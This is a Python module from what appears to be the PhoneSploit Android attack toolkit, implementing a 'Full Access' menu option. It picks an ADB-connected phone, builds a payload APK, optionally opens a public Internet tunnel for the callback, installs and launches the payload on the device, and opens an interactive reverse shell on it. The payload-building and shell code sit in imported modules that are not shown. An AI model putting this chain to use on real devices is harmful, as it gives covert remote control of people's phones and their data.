"""Full Access (CLI option 64): current device → payload → (tunnel) → shell.

A single menu choice that wires the whole chain: pick the connected device,
optionally open a public tunnel, build+install the FGS payload, then drop into
a pure-Python interactive shell. No Metasploit required. Exception-safe: a
failure prints a friendly message and returns to the PhoneSploit menu.
"""
from __future__ import annotations

from modules import remoteshell
from modules.config import AppConfig
from modules.console import (
    console,
    print_error,
    print_success,
    print_warning,
    ask,
)

LPORT = remoteshell.LPORT


def full_access(config: AppConfig) -> None:
    console.print("\n[bold cyan]▸ FULL ACCESS[/bold cyan]  device → payload → shell\n")

    # show tunnel status if portmap configured
    pm = remoteshell.loadportmap_config()
    default_mode = "2" if pm else "1"
    hint = f"[dim](1=USB/LAN, 2=Internet{': portmap ' + pm['dial_host'] + ':' + pm['public_port'] if pm else ' (tunnel)'})[/dim]"
    mode = ask(f"[cyan]Connection mode[/cyan] {hint}> ").strip()
    mode = mode or default_mode
    if mode not in ("1", "2"):
        print_error(f"invalid mode: {mode}")
        return

    serial = remoteshell.first_device(allowed_wifi=True)
    if not serial:
        print_error("no device connected — plug USB or `adb connect IP:5555` first")
        return
    print_success(f"device: {serial}")

    # build payload (loopback + adb reverse for both modes keeps it simple/robust)
    print("[dim]building FGS payload (LHOST=127.0.0.1)…[/dim]")
    apk = remoteshell.build_fgs_payload("127.0.0.1", LPORT)
    if not apk:
        return

    tun = None
    if mode == "2":
        print("[dim]opening tunnel…[/dim]")
        tun = remoteshell.open_tunnel()
        if tun and tun.endpoint_host:
            print_success(f"public: {tun.endpoint} → localhost:{LPORT}")
        else:
            print_warning("tunnel not up — falling back to local reverse channel")

    remoteshell.set_reverse(serial, LPORT)

    if not remoteshell.install_and_launch(serial, apk):
        if tun:
            remoteshell.stop_tunnel(tun)
        return

    console.print(
        "\n[bold cyan]▓▓ FULL ACCESS READY ▓▓[/bold cyan]\n"
        f"  device  : {serial}\n"
        f"  channel : 127.0.0.1:{LPORT} (adb reverse)\n"
        + (f"  public  : {tun.endpoint}\n" if tun and tun.endpoint_host else "")
        + "\n[dim]waiting for payload to connect…[/dim]\n"
    )
    try:
        remoteshell.run_shell(timeout=120)
    except Exception as e:
        print_warning(f"shell issue: {e}")

    if tun:
        remoteshell.stop_tunnel(tun)
    print_warning("\nsession closed — back to menu")
